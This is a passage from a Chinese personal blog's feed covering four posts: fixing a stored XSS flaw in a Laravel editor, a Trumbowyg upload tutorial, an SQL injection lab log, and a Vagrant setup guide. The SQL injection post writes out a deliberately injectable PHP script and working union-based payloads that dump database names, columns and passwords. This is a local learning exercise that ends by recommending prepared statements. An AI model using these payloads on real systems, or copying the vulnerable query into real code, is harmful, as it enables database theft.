    <content type="html"><![CDATA[<p>接上一篇编辑器的使用，自己尝试着写了一段js代码，本以为laravel的</p><pre><code>{{ $item }}</code></pre><p>渲染可以完美的避免 XSS 的攻击（确实可以避免），但是由于 Editor 生成的时候，重新渲染了一遍，导致了可能出现的XSS漏洞。</p><p><img src="/images/2017-7-11-20-51.png" alt="Pic"></p><p><img src="/images/2017-7-11-20-52.png" alt="Pic"></p><p>可以看到，Editor已经帮助我们做了html的编码，于是我觉得不需要进行二次编码，就直接存到了数据库里，并且直接在前端进行了渲染。</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [                &#39;content&#39;   =&gt; $content,                &#39;title&#39;     =&gt; $title,                &#39;fileName&#39;  =&gt; $file_name,                &#39;filePath&#39;  =&gt; $file_path            ]);</code></pre><p>view</p><pre><code class="html">&lt;textarea id=&quot;editor&quot; name=&quot;editor&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;    {{ $notice['content'] }}&lt;/textarea&gt;</code></pre><p>看起来一点问题也没有对不对！！</p><p>然而当渲染的时候缺弹出了一个框框······</p><p><img src="/images/2017-7-11-21-02.png" alt="Pic"></p><p>查看代码发现变成了整个样子</p><p><img src="/images/2017-7-11-21-03.png" alt="Pic"></p><p>哇，说好的前端渲染可以防止XSS呢！！！</p><p>在鹏鹏的帮助下，发现了原因，尽管我们在 editor 中输入的恶意代码经过了转义，但是Editor会在Dom加载完成后再进行一次渲染，导致第一次加载Dom时，被转义过的 html entity 被解析成了正确的字符，而Editor重新获取这些解析后的内容，再一次输出到了界面上，导致了最后的恶意代码执行。</p><p>于是我在后台处理的时候进行了一次转义</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [                &#39;content&#39;   =&gt; htmlspecialchars($content),                &#39;title&#39;     =&gt; $title,                &#39;fileName&#39;  =&gt; $file_name,                &#39;filePath&#39;  =&gt; $file_path            ]);</code></pre><p>这一次解决了当前的问题，恶意代码以字符形式显示了出来</p><p><img src="/images/2017-7-11-21-14.png" alt="Pic"></p><p>然而，有一种东西叫做 Postman，在这里的输入可不会乖乖的向Editor一样帮你做好转义</p><p>Ok，你跟我说laravel 有 csrftoken 保护，但理论上是可以完全模拟浏览器请求的（虽然我不会）</p><p>于是我采取了这样的方法，删掉你的 Editor ，没错就是这么暴力，只在Dom树里面留下Textarea的东西</p><p><img src="/images/2017-7-11-21-29.png" alt="Pic"></p><p>于是，该死的注入又出现了</p><p><img src="/images/2017-7-11-21-33.png" alt="Pic"></p><p>查看代码发现转义又失效了，MMP！！！</p><p><img src="/images/2017-7-11-21-34.png" alt="Pic"></p><p>其实原因也很简单，最开始成功的原因是我们假设之前的恶意代码已经被转义一次了，那么由于Editor的机制，我们只需要进行二次转义就可以了。但是，这一次恶意代码没有像我们想的那样经过了转义。</p><p>那在渲染的时候再转义一次不就好了，哼唧</p><p>于是我又修改了我的view代码，现在Controller和view看起来是这个样子的：</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [                &#39;content&#39;   =&gt; htmlspecialchars($content),                &#39;title&#39;     =&gt; $title,                &#39;fileName&#39;  =&gt; $file_name,                &#39;filePath&#39;  =&gt; $file_path            ]);</code></pre><p>View</p><pre><code class="html"> {!! htmlspecialchars($notice[&#39;content&#39;]) !!}</code></pre><p>这下总万事大吉了吧，结果</p><p><img src="/images/2017-7-11-21-42.png" alt="Pic"></p><p>WTF？？？？？？？？？？？？</p><p>好吧，我自己作死转义了两次，恶意代码是防住了，正常代码也被干掉了。</p><p>好吧我承认其实从这里开始才是有用的东西</p><p>在第一次转义的时候避免二次转义，第二次转义正常转义，可以完美的解决这个问题</p><p>Controller</p><pre><code class="php">$res = Notification::updateById($notice_id, [      // 防止编辑器xss攻击，这里进行转义，同时避免二次编码      &#39;content&#39;   =&gt; htmlspecialchars($content, ENT_COMPAT | ENT_HTML401, ini_get(&quot;default_charset&quot;) , false),      &#39;title&#39;     =&gt; $title,      &#39;fileName&#39;  =&gt; $file_name,      &#39;filePath&#39;  =&gt; $file_path]);</code></pre><p>View</p><pre><code class="html"> {!! htmlspecialchars($notice[&#39;content&#39;]) !!}</code></pre><p>好了，世界安静了，去**的XSS。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;接上一篇编辑器的使用，自己尝试着写了一段js代码，本以为laravel的&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{{ $item }}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;渲染可以完美的避免 XSS 的攻击（确实可以避免），但是由于 Editor 生成的时候，重新渲染了一遍，导致了可能
      
    
    </summary>
    
      <category term="个人日记" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="editor" scheme="https://blog.liebes.top/tags/editor/"/>
    
      <category term="xss" scheme="https://blog.liebes.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Trumbowyg 轻量级的 WYSIWYG 编辑器（附带 Laravel 文件上传）</title>
    <link href="https://blog.liebes.top/2017/07/10/trumbowyg-file-upload/"/>
    <id>https://blog.liebes.top/2017/07/10/trumbowyg-file-upload/</id>
    <published>2017-07-10T19:35:32.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>假期写代码，整理一些关于Editor，文件上传相关的东西。</p><ul><li><a href="#editor">editor</a></li><li><a href="#upload">文件上传（Laravel）</a></li></ul><h2 id="editor">Trumbowyg Editor</h2><p>Trumbowyg 是一款轻量级的编辑器，可以高度DIY，界面也很简洁。</p><p>官方网站：<a href="https://alex-d.github.io/Trumbowyg/" target="_blank" rel="noopener">Trumbowyg</a></p><p>首先下载官方包，在官网可以直接下载。</p><p>目录结构如下：</p><p><img src="/images/2017-7-10-7-47.png" alt="Pic"></p><p>其中只需要留下 dist 文件夹即可，其余的是文档，例子，直接删除即可。</p><p>使用方法很简单，在 view 界面引用相关的 css 文件与 js 文件，这里默认已经引用了Jquery</p><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; href=&quot;/Trumbowyg/dist/ui/trumbowyg.min.css&quot;&gt;&lt;script src=&quot;/Trumbowyg/dist/trumbowyg.js&quot;&gt;&lt;/script&gt;</code></pre><p>同时需要创建一个 <code>textarea</code> 作为 editor 的容器</p><pre><code>&lt;textarea id=&quot;editor&quot; name=&quot;editor&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;&lt;/textarea&gt;</code></pre><p>接下来就可以使用Trumbowyg 创建一个编辑器出来</p><pre><code class="html">&lt;script&gt;        $(&#39;#editor&#39;).trumbowyg({            btnsDef: {                // 设置上传的3种方法，远程上传，本地上传，图片64位加密                image: {                    dropdown: [&#39;insertImage&#39;, &#39;upload&#39;],                    ico: &#39;insertImage&#39;                }            },            btns: [                [&#39;viewHTML&#39;],                [&#39;formatting&#39;],                &#39;btnGrp-design&#39;,                [&#39;superscript&#39;, &#39;subscript&#39;],                &#39;image&#39;,                &#39;btnGrp-justify&#39;,                &#39;btnGrp-lists&#39;,                [&#39;horizontalRule&#39;],                [&#39;table&#39;],                [&#39;foreColor&#39;, &#39;backColor&#39;],                [&#39;removeformat&#39;],                [&#39;fullscreen&#39;]            ],            plugins: {                upload: {                    serverPath: &#39;/manager/file&#39;,                    fileFieldName: &#39;upload&#39;,                    usage : &#39;notice&#39;                }            },            autogrow: true        });    &lt;/script&gt;</code></pre><p>其中 <code>btnsDef</code> 是自己定义的按钮组，<code>btns</code> 是显示出来的按钮，下面是文件上传插件。<code>autogrow</code> 参数定义了文本域的自动缩放</p><p>显示出来的效果如下：</p><p><img src="/images/2017-7-10-21-20.png" alt="Pic"></p><p><img src="/images/2017-7-10-21-21.png" alt="Pic"></p><p>可能你会发现你的下拉图片按钮里面并没有上传图片的选项，因此我们还需要引用一下图片上传的插件。这个文件要在上面的js文件之后引入</p><pre><code class="html">&lt;script src=&quot;/Trumbowyg/dist/plugins/upload/trumbowyg.upload.js&quot;&gt;&lt;/script&gt;</code></pre><p>接下俩介绍 plugins upload 里面的几个参数</p><ul><li>serverPath : 文件上传 Controller 的路径，用于后台处理上传图片</li><li>fileFieldName : 后台接收文件的名字，也就是 <code>&lt;input name=&#39;upload&#39;&gt;</code></li><li>usage : 是海痴自己加上的，用于判断上传来源，方便管理，这个不是官方参数，需要自己修改 js 源码</li></ul><h2 id="upload">文件上传（Laravel）</h2><p>接下来需要定义后台代码，这里使用Laravel 5.4框架。</p><p>配置文件：<code>config/imageUpload.php</code></p><pre><code class="php">&lt;?php/** * Created by PhpStorm. * User: liebes * Date: 2017/7/10 * Time: 下午3:42 */$imageExtensions = [    &#39;png&#39;, &#39;jpeg&#39;, &#39;jpg&#39;, &#39;bmp&#39;];return [    &#39;max_size&#39; =&gt; 1024 * 1024 * 5,  // default 5MB    &#39;rules&#39; =&gt; [        &#39;notice&#39; =&gt; [            &#39;path&#39; =&gt; &#39;notification&#39;,            &#39;extensions&#39; =&gt; $imageExtensions,            &#39;disk&#39; =&gt; &#39;public&#39;,            &#39;max_size&#39; =&gt; 1024 * 1024 * 50        ],    ]];</code></pre><p>这个配置文件定义了图片上传大小，图片后缀，图片所属等等信息，可以自由定义</p><p>Controller 文件 <code>FileController.class.php</code></p><pre><code class="php">&lt;?phpnamespace App\Http\Controllers\Manager;use App\Http\Helpers\Resources;use Illuminate\Http\Request;use App\Http\Controllers\Controller;use App\Models\Image;use Illuminate\Support\Facades\Config;use Mockery\Exception;class FileController extends Controller{    // 图片上传配置文件    protected $config;    // 上传规则    protected $rules;    public function __construct()    {        $this-&gt;config = config(&#39;imageUpload&#39;);        $this-&gt;rules = array_keys(config(&#39;imageUpload.rules&#39;));    }    /**     * 图片上传方法，配置参见config.ImageUpload     * @param Request $request     * @return \Illuminate\Http\JsonResponse     */    public function upload(Request $request){        $usage = $request-&gt;input(&#39;usage&#39;);        if(empty($usage) || !$this-&gt;checkUsage($usage)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;规则不符&#39;            ]);        }        if(!$request-&gt;hasFile(&#39;upload&#39;)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;上传失败&#39;            ]);        }        $file = $request-&gt;file(&#39;upload&#39;);        $size = $file-&gt;getSize();        $extension = $file-&gt;extension();        if(!$this-&gt;checkExtension($extension, $usage)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;文件类型不符&#39;            ]);        }        if(!$this-&gt;checkFileSize($size, $usage)){            return response()-&gt;json([                &#39;message&#39; =&gt; &#39;文件不能大于5M&#39;            ]);        }        $name = $file-&gt;hashName();        $disk = $this-&gt;config[&#39;rules&#39;][$usage][&#39;disk&#39;];        $path = $file-&gt;store($this-&gt;config[&#39;rules&#39;][$usage][&#39;path&#39;], $disk);        $image = Image::createImg([            &#39;name&#39;  =&gt; $name,            &#39;size&#39;  =&gt; $size,            &#39;extension&#39; =&gt; $extension,            &#39;path&#39;  =&gt; $path        ]);        return response()-&gt;json([            &#39;success&#39; =&gt; true,            &#39;file&#39; =&gt; config(&#39;filesystems.disks.&#39;.$disk.&#39;.url&#39;).&#39;/&#39;.$path,            &#39;info&#39; =&gt; $image,        ]);    }    /**     * @param $usage     * @return bool     */    protected function checkUsage($usage){        return in_array($usage, $this-&gt;rules);    }    /**     * @param $extension     * @param $usage     * @return bool     */    protected function checkExtension($extension, $usage){        return in_array($extension, $this-&gt;config[&#39;rules&#39;][$usage][&#39;extensions&#39;]);    }    /**     * @param $size     * @param $usage     * @return bool     */    protected function checkFileSize($size, $usage){        $max_size = $this-&gt;config[&#39;rules&#39;][$usage][&#39;max_size&#39;] ?? $this-&gt;config[&#39;max_size&#39;];        return $size &lt; $max_size;    }}</code></pre><p>之后在路由里面配置好路由，即可。</p><pre><code class="php">Route::post(&#39;file&#39;, &#39;FileController@upload&#39;);</code></pre><p>由于这里做了usage的检测，所以需要在上传文件的时候加上usage这个属性，需要修改js文件如下</p><p><code>trumbowyg.upload.js</code></p><pre><code class="javascript">plugins: {    upload: {        init: function (trumbowyg) {            trumbowyg.o.plugins.upload = $.extend(true, {}, defaultOptions, trumbowyg.o.plugins.upload || {});            var btnDef = {                fn: function () {                    trumbowyg.saveRange();                    var file,                        usage = trumbowyg.o.plugins.upload.usage,                        prefix = trumbowyg.o.prefix;                    var $modal = trumbowyg.openModalInsert(                  ·········</code></pre><p>在这里加上usage参数</p><p><code>trumbowyg.upload.js</code></p><pre><code class="javascript">// Callbackfunction (values) {    var data = new FormData();    data.append(trumbowyg.o.plugins.upload.fileFieldName, file);    data.append(&quot;usage&quot;, usage);    trumbowyg.o.plugins.upload.data.map(function (cur) {        data.append(cur.name, cur.value);    });</code></pre><p>在提交的Form表单里加上usage的参数</p><p>修改以上两处即可</p><p>当然在提交的时候可能会出现csrftoken miss match 的问题，参考Laravel文档</p><p><a href="http://d.laravel-china.org/docs/5.4/csrf#csrf-x-csrf-token" target="_blank" rel="noopener">Laravel 下的伪造跨站请求保护 CSRF</a></p><p>在html界面头加上 meta 属性</p><pre><code class="html">&lt;meta name=&quot;csrf-token&quot; content=&quot;{{ csrf_token() }}&quot;&gt;</code></pre><p>同时在调用ajax方法之前，进行设置</p><pre><code class="javascript">&lt;script&gt;    $.ajaxSetup({        headers: {            &#39;X-CSRF-TOKEN&#39;: $(&#39;meta[name=&quot;csrf-token&quot;]&#39;).attr(&#39;content&#39;)        }    });&lt;/script&gt;</code></pre><p>以上就是全部的使用Trumbowyg编辑器与laravel文件上传的全部</p><p>最后，吐槽一下ckeditor，丫把所有的文件上传界面都定义在一个iframe里，不是异步递交，到死我都没解决出来csrftoken的问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;假期写代码，整理一些关于Editor，文件上传相关的东西。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#editor&quot;&gt;editor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#upload&quot;&gt;文件上传（Laravel）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;e
      
    
    </summary>
    
      <category term="个人日志" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="editor" scheme="https://blog.liebes.top/tags/editor/"/>
    
      <category term="文件上传" scheme="https://blog.liebes.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SQL injection 学习</title>
    <link href="https://blog.liebes.top/2017/05/22/web-security-2/"/>
    <id>https://blog.liebes.top/2017/05/22/web-security-2/</id>
    <published>2017-05-22T02:37:43.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>在国哥的安排下，对着 kali渗透测试之 SQL injeciton 视频教程一顿撸（虽然没什么卵用），记录下来自己的一些实验过程和经历。</p><h2 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h2><ul><li>本地的 lemp 环境，搭建可参考：<a href="https://wanghaichi.github.io/2017/01/21/lempServer/" target="_blank" rel="noopener">Centos 7 Nginx + php + mysql Web服务器搭建</a> 和 <a href="https://wanghaichi.github.io/2017/03/10/lemp-Ubantu/" target="_blank" rel="noopener">Unbuntu16.04 Nginx + php + mysql Web服务器搭建</a> 当然 xampp 也是极好的。</li><li>用于攻击的 php 脚本和数据库，下面会给出</li></ul><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>找个能够访问的地方，编写如下 php 脚本</p><pre><code class="php">&lt;html&gt;    &lt;head&gt;&lt;/head&gt;    &lt;body&gt;        &lt;form action=&quot;./login.php&quot; method=&quot;post&quot;&gt;            ID&lt;input name=&quot;id&quot; type=&quot;text&quot;&gt;&lt;br/&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;/form&gt;        &lt;div&gt;        &lt;p&gt;            &lt;?php                if($_POST[&#39;id&#39;]){                    $connection = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;hhxxttxs&quot;, &quot;test&quot;);                    if($connection-&gt;connect_errno){                         echo &quot;Failed to connect to MySQL: (&quot; . $connection-&gt;connect_errno . &quot;) &quot; . $connection-&gt;connect_error;                    }                    $id = $_POST[&#39;id&#39;];                    // echo $name.&quot;&lt;br/&gt;&quot;.$password.&quot;&lt;br/&gt;&quot;;                    $sql = &quot;SELECT name, password FROM `user` WHERE `id` = &#39;&quot;. $id . &quot;&#39;&quot;;                    echo $sql.&quot;&lt;br/&gt;&quot;;                    $res = $connection-&gt;query($sql);                    // var_dump($res);                    while($row = $res-&gt;fetch_assoc() ){                        echo &quot;姓名: &quot;. $row[&#39;name&#39;] . &quot;&lt;br/&gt;&quot;;                        echo &quot;密码: &quot;. $row[&#39;password&#39;] . &quot;&lt;br/&gt;&quot;;                    }                }            ?&gt;        &lt;/p&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>在本地新建数据库 <code>test</code>，新建 user 表</p><p><img src="/images/2017-5-22-10-45.png" alt="Picture"></p><h2 id="SQL-injection-简介"><a href="#SQL-injection-简介" class="headerlink" title="SQL injection 简介"></a>SQL injection 简介</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>服务器端程序将用户输入参数作为参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器</p></blockquote><p>对于一般处理数据库查询的语句，客户端会将用户输入的参数使用<code>&#39;&#39;</code>包裹之后，形成 SQL 查询字符串，交给 SQL 服务去处理。对于没有进过数据处理的脚本，很容易产生 SQL 注入。</p><p>我们可以手动输入 <code>&#39; &quot; % ( )</code>这些在 SQL 语法中有特殊含义的字符，进行 SQL 注入攻击。</p><h3 id="用户登录判断"><a href="#用户登录判断" class="headerlink" title="用户登录判断"></a>用户登录判断</h3><ul><li><code>SELECT * FROM users WHERE user=&#39;uname&#39; AND password=&#39;pass&#39;</code></li><li><code>SELECT * FROM users WHERE user=&#39;name&#39; AND password=&#39;&#39; OR &#39;&#39;=&#39;&#39;</code></li></ul><p>通过以上语句可以跳过用户验证，因为第二个 SQL 语句恒为真。</p><h3 id="手动漏洞挖掘–SQL注入"><a href="#手动漏洞挖掘–SQL注入" class="headerlink" title="手动漏洞挖掘–SQL注入"></a>手动漏洞挖掘–SQL注入</h3><p>注意下面的所有事例中 + 表示空格，不加空格 <code>--</code> 起不了注释的作用。</p><h4 id="基于报错的检测方法"><a href="#基于报错的检测方法" class="headerlink" title="基于报错的检测方法"></a>基于报错的检测方法</h4><ul><li><code>&#39; &quot; % ( )</code></li></ul><h4 id="基于布尔的检测"><a href="#基于布尔的检测" class="headerlink" title="基于布尔的检测"></a>基于布尔的检测</h4><ul><li><code>1&#39; and &#39;1&#39;=&#39;1</code>   /   <code>1&#39; and &#39;1</code></li><li><code>1&#39; and &#39;1&#39;=&#39;1</code>   /   <code>1&#39; and &#39;0</code></li></ul><h4 id="表列数-显示信息位于哪一列"><a href="#表列数-显示信息位于哪一列" class="headerlink" title="表列数 / 显示信息位于哪一列"></a>表列数 / 显示信息位于哪一列</h4><ul><li><code>&#39; order by 9--+</code></li><li>select * 时表字段数=查询字段数</li></ul><p>可以通过这个方法判断当前表中有多少列，但需要脚本中的 SQL 语句使用 <code>*</code> 作为查询域</p><h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><ul><li><code>&#39; union select 1,2--+</code></li></ul><p><img src="/images/2017-5-22-10-35.png" alt="Picture"></p><ul><li><code>&#39; union all select database(),2--+</code> // 显示数据库名</li></ul><p><img src="/images/2017-5-22-10-36.png" alt="Picture"></p><ul><li><code>&#39; union all select user(), version()--+</code> // 显示用户，数据库版本</li></ul><p><img src="/images/2017-5-22-11-02.png" alt="Picture"></p><ul><li><code>&#39; union select database(), substring_index(USER(),&quot;@&quot;,1)--</code></li></ul><p><img src="/images/2017-5-22-11-04.png" alt="Picture">;</p><h4 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h4><ul><li><code>@@datadir @@hostname @@VERSION @@version_compile_os--+</code></li></ul><p><img src="/images/2017-5-22-11-09.png" alt="Picture"></p><p><img src="/images/2017-5-22-11-10.png" alt="Picture"></p><p><img src="/images/2017-5-22-11-11.png" alt="Picture"></p><h4 id="当前库"><a href="#当前库" class="headerlink" title="当前库"></a>当前库</h4><ul><li><code>database()</code></li></ul><h4 id="ASCII转字符"><a href="#ASCII转字符" class="headerlink" title="ASCII转字符"></a>ASCII转字符</h4><ul><li><code>char()</code></li></ul><p>char 函数可以将 ascii 码转换成对应的字符。</p><h4 id="连接字符串"><a href="#连接字符串" class="headerlink" title="连接字符串"></a>连接字符串</h4><ul><li><code>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</code></li></ul><p><img src="/images/2017-5-22-11-14.png" alt="Picture"></p><p>这里使用 CONCAT_WS 函数，将三个数据库信息拼接在一起，同时使用 <code>:</code> 进行分割。</p><h4 id="计算哈希"><a href="#计算哈希" class="headerlink" title="计算哈希"></a>计算哈希</h4><ul><li><code>md5()</code></li></ul><p>可以使用目标服务器进行大规模的数据计算</p><h4 id="Mysql-数据结构"><a href="#Mysql-数据结构" class="headerlink" title="Mysql 数据结构"></a>Mysql 数据结构</h4><ul><li>information_schema</li></ul><h4 id="所有库所有表-统计库中表的数量"><a href="#所有库所有表-统计库中表的数量" class="headerlink" title="所有库所有表 / 统计库中表的数量"></a>所有库所有表 / 统计库中表的数量</h4><ul><li><code>&#39; union select table_name, table_schema from information_schema.tables--+</code></li></ul><p><img src="/images/2017-5-22-11-17.png" alt="Picture"></p><ul><li><code>&#39; union select table_schema,count(*) FROM information_schema.tables group by table_schema --</code></li></ul><p><img src="/images/2017-5-22-11-23.png" alt="Picture"></p><h4 id="test库中的表名"><a href="#test库中的表名" class="headerlink" title="test库中的表名"></a>test库中的表名</h4><ul><li><code>&#39; union select table_name, table_schema from information_schema.tables where table_schema=&#39;test&#39;--+</code></li></ul><p><img src="/images/2017-5-22-11-26.png" alt="Picture"></p><h4 id="Users表中的所有列（user-id-first-name-last-name-user-password-avatar）"><a href="#Users表中的所有列（user-id-first-name-last-name-user-password-avatar）" class="headerlink" title="Users表中的所有列（user_id first_name last_name user password avatar）"></a>Users表中的所有列（user_id first_name last_name user password avatar）</h4><ul><li><code>&#39; union select table_name, column_name from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;user&#39;--+</code></li></ul><p><img src="/images/2017-5-22-11-27.png" alt="Picture"></p><p>可以看到 user 表中的所有列名都被列出来了！</p><h4 id="查询-user-password-列的内容"><a href="#查询-user-password-列的内容" class="headerlink" title="查询 user password 列的内容"></a>查询 user password 列的内容</h4><ul><li><code>&#39; union select name, password from test.user--+</code></li></ul><p><img src="/images/2017-5-22-11-29.png" alt="Picture"></p><ul><li><code>&#39; union select null, concat(name, 0x3a, password) from user--+</code></li></ul><p><img src="/images/2017-5-22-11-30.png" alt="Picture"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>可以看到一个简单的 SQL injection 漏洞，几乎可以攻击所有的数据库。更有甚者还可以直接攻击服务器（下回说）。因此在编写代码时一定要注意 SQL 语句的过滤。</p><p>目前看来，所有的过滤手段都是不可靠的，都有方法可以通过截断、欺骗等进行攻击。因此正确的操作应该是用 SQL 预编译，进行参数绑定，这样可以保证 SQL 的查询语句不被篡改。具体方法可以参见 <a href="http://php.net/manual/zh/mysqli.quickstart.prepared-statements.php" target="_blank" rel="noopener">mysqli Prepared Statements</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在国哥的安排下，对着 kali渗透测试之 SQL injeciton 视频教程一顿撸（虽然没什么卵用），记录下来自己的一些实验过程和经历。&lt;/p&gt;
&lt;h2 id=&quot;提前准备&quot;&gt;&lt;a href=&quot;#提前准备&quot; class=&quot;headerlink&quot; title=&quot;提前准备&quot;&gt;&lt;
      
    
    </summary>
    
      <category term="安全" scheme="https://blog.liebes.top/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://blog.liebes.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql injection" scheme="https://blog.liebes.top/tags/sql-injection/"/>
    
  </entry>
  
  <entry>
    <title>Vagrant ： Windows下开发小助手，告别双系统</title>
    <link href="https://blog.liebes.top/2017/05/17/vagrant-windows-init/"/>
    <id>https://blog.liebes.top/2017/05/17/vagrant-windows-init/</id>
    <published>2017-05-17T03:29:56.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>不知道广大程序员们是怎么处理 Windows 和 Linux 的，最开始在 Windows 下面跑 Linux 的虚拟机，卡的自己怀疑人生。后来做了个双系统，自己 250 的固态表示根本不够用，而且动不动关机重启，别问我为什么，毕竟 office 割舍不了。后来一个学长点了我一下，既然想用 Linux 搞事情，用什么图形化界面，搞个服务器不就好了。然后我就搞了个腾讯云，然而，网络不好的时候真的蛋疼。最后，在宁哥大腿的指引下，尝试了一下 Vagrant 虚拟机，快的飞起，果断放弃双系统。</p><p>这里记录一些自己在搭建 Vagrant 环境时的步骤以及踩的坑。</p><p>提前准备：</p><ul><li><a href="https://www.vagrantup.com/" target="_blank" rel="noopener">Vagrant</a></li><li><a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener">VirtureBox</a></li></ul><p>首先，我们要选择一个适合我们的 box 也就是操作系统。Vagrant 提供了许多 box 供我们使用：<a href="https://atlas.hashicorp.com/boxes/search" target="_blank" rel="noopener">Vagrant Box</a> 。这里，海痴选择的是 ubuntu16.04。</p><p>那么，当我们装好了 Vagrant，VirtureBox，并且下载好所需要的box以后，就可以开始搞事情了。当然，为了接下来的发展更加顺利，强烈建议装一个 Git ，毕竟 Git bash 异常的好用。</p><p>我们新建一个文件夹，命名为 ubuntu，并且将我们的 box 移到这个目录下。在这个目录打开命令行界面，添加box</p><pre><code>$ vagrant box add xenial-server-cloudimg-amd64-vagrant.box</code></pre><p>添加后的 box 可以使用 <code>vagrant box list</code> 来查看<br>更多的 vagrant 操作，可以参考这篇博客 <a href="https://segmentfault.com/a/1190000000264347" target="_blank" rel="noopener">使用 Vagrant 打造跨平台开发环境</a></p><p>接下来，运行 <code>vagrant up</code> 来启动这个虚拟机。这是一个漫长的过程，如果你使用 Windows 命令行，可能会更慢。</p><p><img src="/images/2017-05-17-11-28.png" alt="Picture"></p><p>细心地你如果打开 VirtureBox，会发现那里已经有一个虚拟机躺着啦</p><p>这个时候，我们的名为 ubuntu 的文件夹里面会多几个文件，其中 Vagrantfile 是 Vagrant 虚拟机的配置文件，这个先不用管，以后再说。</p><p>此时我们可以通过 ssh 的方式连接虚拟机，Windows 可以使用 PuTTy，当然，我们的 Git bash 帮我们准备好了这些。打开终端（Git bash），执行 <code>vagrant ssh</code> ，怎么样，是不是看到了一个闪闪发亮的 Linux！</p><p><img src="/images/2017-05-17-11-29.png" alt="Picture"></p><p>接下来的配置大家就可以按需进行拉，和 Vagrant 就没有太大关系了。当然，有一些配置是需要注意的。</p><h4 id="Vagrant-端口转发"><a href="#Vagrant-端口转发" class="headerlink" title="Vagrant 端口转发"></a>Vagrant 端口转发</h4><p>在 Vagrantfile 配置文件中，取消以下几行的注释</p><pre><code>config.vm.network &quot;forwarded_port&quot;, guest: 3306, host: 4567config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 8080, host_ip: &quot;127.0.0.1&quot;config.vm.network &quot;private_network&quot;, ip: &quot;192.168.33.10&quot;</code></pre><p>该命令可以将虚拟机的端口与本机的端口进行对应，当然，根据需要可以进行更多的端口转发，其中第三行，可以不进行端口转发，直接通过 ip 地址访问虚拟机。</p><h4 id="Vagrant-共享文件夹"><a href="#Vagrant-共享文件夹" class="headerlink" title="Vagrant 共享文件夹"></a>Vagrant 共享文件夹</h4><pre><code>config.vm.synced_folder &quot;../../../data/whc_web&quot;, &quot;/vagrant_data&quot;</code></pre><p>意图很清晰，这也是 Vagrant 虚拟机非常好用的一点，可以在主机使用 IDE 进行写码，然后在虚拟机中运行。配合下面的预执行SHELL脚本效果更佳</p><h4 id="Vagrant-预执行脚本"><a href="#Vagrant-预执行脚本" class="headerlink" title="Vagrant 预执行脚本"></a>Vagrant 预执行脚本</h4><pre><code>  config.vm.provision &quot;shell&quot;, inline: &lt;&lt;-SHELL    rm /var/www/html -rf    ln -s /vagrant_data /var/www/html  SHELL</code></pre><p>  在执行 <code>vagrant up</code> 指令时会执行，可根据需要自定义，不过需要注意的是需要有对应目录的权限，对于 lemp 开发环境的同学，将 /var/www/html 设置成根目录，并调整对应权限，把项目代码放着这里即可</p><h4 id="通过主机连接-Vagrant-MySQL-数据库"><a href="#通过主机连接-Vagrant-MySQL-数据库" class="headerlink" title="通过主机连接 Vagrant MySQL 数据库"></a>通过主机连接 Vagrant MySQL 数据库</h4><p>安装 MySQL 就不多说了，安装之后需要配置一下<br> MySQL 的配置文件 <code>my.cnf</code><br>海痴的 <code>my.cnf</code> 实际上引用的配置文件在 <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> 修改以下行</p><pre><code># bind-address = 127.0.0.1bind-address = 0.0.0.0</code></pre><p>重启 MySQL 服务就可以了</p><h4 id="通过-PuTTy-ssh-连接Vagrant"><a href="#通过-PuTTy-ssh-连接Vagrant" class="headerlink" title="通过 PuTTy ssh 连接Vagrant"></a>通过 PuTTy ssh 连接Vagrant</h4><p>网上说的默认账号密码都是 <code>vagrant</code> 然而我的账号是 <code>ubuntu</code> 密码是空，然而 ssh 是不允许无密码访问的。所以需要先设置 ubuntu 